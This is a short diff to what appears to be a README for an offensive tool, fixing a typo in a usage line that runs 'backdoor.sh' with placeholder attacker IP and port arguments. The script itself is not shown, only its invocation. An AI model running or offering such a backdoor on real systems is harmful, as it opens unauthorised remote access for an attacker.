@@ -14,7 +14,7 @@ Usage :
   
   $ chmod +x *
   
-  $ ash backdoor.sh <Attacker IP> <Port>
+  $ bash backdoor.sh <Attacker IP> <Port>
   
 Images :
 
